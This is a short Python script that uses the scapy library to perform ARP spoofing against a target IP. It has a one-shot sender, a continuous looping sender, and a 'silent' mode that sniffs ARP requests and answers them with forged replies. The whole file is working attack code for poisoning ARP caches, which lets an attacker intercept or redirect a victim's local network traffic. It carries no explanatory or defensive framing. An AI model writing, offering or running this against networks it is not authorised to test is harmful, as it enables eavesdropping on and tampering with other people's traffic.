import scapy.all as sc
import threading
import time

def send_spoof_packet(target_ip, spoofed_ip):
    """
    Send a spoofing packet
    """
    packet = sc.ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
    sc.send(packet, verbose=False)

def continuous_arp_spoof(target_ip, spoofed_ip, interval):
    """
    start a loop that continuously sends spoofing packets, interval in seconds
    """
    try:
        print(f"starting contiuous arp spoof from {target_ip} to {spoofed_ip} with interval {interval} seconds")
        packet = sc.ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
        sc.send(packet, inter=interval, loop=True)
    except KeyboardInterrupt:
        print(f"stopping continuous ARP spoofing")

def silent_arp_spoof(target_ip, spoofed_ip):
    print(f"starting silent arp spoof of {target_ip} to {spoofed_ip}")

    def handle_arp_packet(packet):
        if packet.haslayer(sc.ARP) and packet[sc.ARP].op == 1:
            if packet[sc.ARP].psrc == target_ip and packet[sc.ARP].pdst == spoofed_ip:
                print(f"got arp request from {target_ip} to {spoofed_ip}")
                send_spoof_packet(target_ip, spoofed_ip)
                print(f"Send spoofed packet: {spoofed_ip} is at {sc.get_if_hwaddr()}")
            elif packet[sc.ARP].psrc == spoofed_ip and packet[sc.ARP].pdst == target_ip:
                print(f"caught arp request from {spoofed_ip} to {target_ip}, ignoring")

    try:
        sc.sniff(filter="arp", prn=handle_arp_packet, store=0)
    except KeyboardInterrupt:
        print(f"Stopping silent ARP spoofing")